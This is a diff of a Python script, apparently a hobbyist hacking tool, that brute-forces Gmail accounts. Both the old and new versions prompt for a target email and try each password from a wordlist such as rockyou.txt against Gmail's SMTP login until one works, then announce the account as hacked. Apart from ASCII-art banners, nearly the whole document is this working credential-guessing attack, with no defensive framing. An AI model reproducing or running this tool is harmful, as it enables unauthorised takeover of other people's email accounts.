@@ -1,74 +1,61 @@
-#!/usr/bin/python
-'''create by Khalid
+Created by 𝙆𝙝𝙖𝙡𝙞𝙙 𝙃𝙪𝙨𝙖𝙞𝙣
 
 import smtplib
+import sys
 from os import system
+def artwork():
+ print("\n") 
 
-def main():
-   print '================================================='
-   print '               create by Khalid Husain                  '
-   print '================================================='
-   print '               ++++++++++++++++++++              '
-   print '                                            '
-   print '                                              '
-   print '                                                 '
-   print '                                                 '
-   print '           KHALID                                '
-   print '       _,.                   '
-   print '     ,` -.)                  '
-   print '    ( _/-\\-._               '
-   print '   /,|`--._,-^|            , '
-   print '   \_| |`-._/||          , | '
-   print '     |  `-, / |         /  / '
-   print '     |     || |        /  /  '
-   print '      `r-._||/   __   /  /   '
-   print '  __,-<_     )`-/  `./  /    '
-   print '  \   `---    \   / /  /     '
-   print '     |           |./  /      '
-   print '     /           //  /       '
-   print ' \_/  \         |/  /        '
-   print '  |    |   _,^- /  /         '
-   print '  |    , ``  (\/  /_         '
-   print '   \,.->._    \X-=/^         '
-   print '   (  /   `-._//^`           '
-   print '    `Y-.____(__}             '
-   print '     |     {__)              ' 
-   print '           ()   V.1.1        '
+print("##########################################################")
+print("# █████████████████████████████████                #")
+print("# █▄─█─▄█─█─██▀▄─██▄─▄███▄─▄█▄─▄▄▀█   Haters       #")
+print("# ██─▄▀██─▄─██─▀─███─██▀██─███─██─█                #")
+print("# ▀▄▄▀▄▄▀▄▀▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▀▄▄▄▄▀▀     DON'T      #")
+print("# ████████████████████████████████████             #")
+print("# █─█─█▄─██─▄█─▄▄▄▄██▀▄─██▄─▄█▄─▀█▄─▄█     HATE    #")
+print("# █─▄─██─██─██▄▄▄▄─██─▀─███─███─█▄▀─██             #")
+print("# ▀▄▀▄▀▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▀▄▄▄▀▀▄▄▀     ME      #")
+print("#                                                        #")      
+print("##########################################################")
 
-main()
-print '[1] start the attack'
-print '[2] exit'
-option = input('==>')
-if option == 1:
-   file_path = raw_input('path of passwords file :')
+
+
+artwork()
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = input("Enter The Target Gmail Adress => ")
+
+print("\n")
+
+pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '2' to Add a custom password list\n => ")
+
+if pwd=='0':
+    passswfile="rockyou.txt"
+
+elif pwd=='2':
+    print("\n")
+    passswfile = input("Name The File Path (For Password List) => ")
+
 else:
-   system('clear')
-   exit()
-pass_file = open(file_path,'r')
-pass_list = pass_file.readlines()
-def login():
-    i = 0
-    user_name = raw_input('target email :')
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.ehlo()
-    for password in pass_list:
-      i = i + 1
-      print str(i) + '/' + str(len(pass_list))
-      try:
-         server.login(user_name, password)
-         system('clear')
-         main()
-         print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
-         break
-      except smtplib.SMTPAuthenticationError as e:
-         error = str(e)
-         if error[14] == '<':
-            system('clear')
-            main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+    print("\n")
+    print("Invalid input!")
+    sys.exit(1)
+try:
+    passswfile = open(passswfile, "r")
 
-            break
-         else:
-            print '[!] password not found => ' + password
-login()
+except Exception as e:
+    print(e)
+    sys.exit(1)
+
+for password in passswfile:
+    try:
+        smtpserver.login(user, password)
+
+        print("[+] Password Found %s" % password)
+        break
+
+    except smtplib.SMTPAuthenticationError:
+        print("[!] Pasword Is Wrong. %s " % password)
